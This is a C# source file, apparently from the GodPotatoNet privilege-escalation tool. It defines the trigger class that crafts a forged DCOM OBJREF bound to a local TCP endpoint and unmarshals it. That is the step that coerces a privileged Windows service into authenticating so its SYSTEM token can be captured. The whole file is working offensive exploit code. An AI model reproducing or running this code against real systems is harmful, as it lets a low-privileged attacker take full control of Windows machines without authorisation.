﻿using System;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

namespace GodPotatoNet.NativeAPI{

    [ComVisible(true)]
    public class GodPotatoNetUnmarshalTrigger  {
        private readonly static Guid IID_IUnknown = new Guid("{00000000-0000-0000-C000-000000000046}");
        private readonly static string binding = "127.0.0.1";
        private readonly static TowerProtocol towerProtocol = TowerProtocol.EPM_PROTOCOL_TCP;


        public readonly static object fakeObject = new object();
        public static IntPtr pIUnknown;
        public static IBindCtx bindCtx;
        public static IMoniker moniker;

        private GodPotatoNetContext GodPotatoNetContext;


        public GodPotatoNetUnmarshalTrigger(GodPotatoNetContext GodPotatoNetContext) {
            this.GodPotatoNetContext = GodPotatoNetContext;


            if (!GodPotatoNetContext.IsStart)
            {
                throw new Exception("GodPotatoNetContext was not initialized");
            }

            if (pIUnknown == IntPtr.Zero)
            {
                pIUnknown = Marshal.GetIUnknownForObject(fakeObject);
            }

            if (bindCtx == null)
            {
                NativeMethods.CreateBindCtx(0, out bindCtx);
            }

            if (moniker == null)
            {
                NativeMethods.CreateObjrefMoniker(pIUnknown, out moniker);
            }

        }


        public int Trigger() {

            string ppszDisplayName;
            moniker.GetDisplayName(bindCtx, null, out ppszDisplayName);
            ppszDisplayName = ppszDisplayName.Replace("objref:", "").Replace(":", "");
            byte[] objrefBytes = Convert.FromBase64String(ppszDisplayName);

            ObjRef tmpObjRef = new ObjRef(objrefBytes);

            GodPotatoNetContext.ConsoleWriter.WriteLine($"[*] DCOM obj GUID: {tmpObjRef.Guid}");
            GodPotatoNetContext.ConsoleWriter.WriteLine($"[*] DCOM obj IPID: {tmpObjRef.StandardObjRef.IPID}");
            GodPotatoNetContext.ConsoleWriter.WriteLine("[*] DCOM obj OXID: 0x{0:x}", tmpObjRef.StandardObjRef.OXID);
            GodPotatoNetContext.ConsoleWriter.WriteLine("[*] DCOM obj OID: 0x{0:x}", tmpObjRef.StandardObjRef.OID);
            GodPotatoNetContext.ConsoleWriter.WriteLine("[*] DCOM obj Flags: 0x{0:x}", tmpObjRef.StandardObjRef.Flags);
            GodPotatoNetContext.ConsoleWriter.WriteLine("[*] DCOM obj PublicRefs: 0x{0:x}", tmpObjRef.StandardObjRef.PublicRefs);

            ObjRef objRef = new ObjRef(IID_IUnknown,
                  new ObjRef.Standard(0, 1, tmpObjRef.StandardObjRef.OXID, tmpObjRef.StandardObjRef.OID, tmpObjRef.StandardObjRef.IPID,
                    new ObjRef.DualStringArray(new ObjRef.StringBinding(towerProtocol, binding), new ObjRef.SecurityBinding(0xa, 0xffff, null))));
            byte[] data = objRef.GetBytes();

            GodPotatoNetContext.ConsoleWriter.WriteLine($"[*] Marshal Object bytes len: {data.Length}");
            
            IntPtr ppv;

            GodPotatoNetContext.ConsoleWriter.WriteLine($"[*] UnMarshal Object");
            return UnmarshalDCOM.UnmarshalObject(data,out ppv);
        }


    }
}
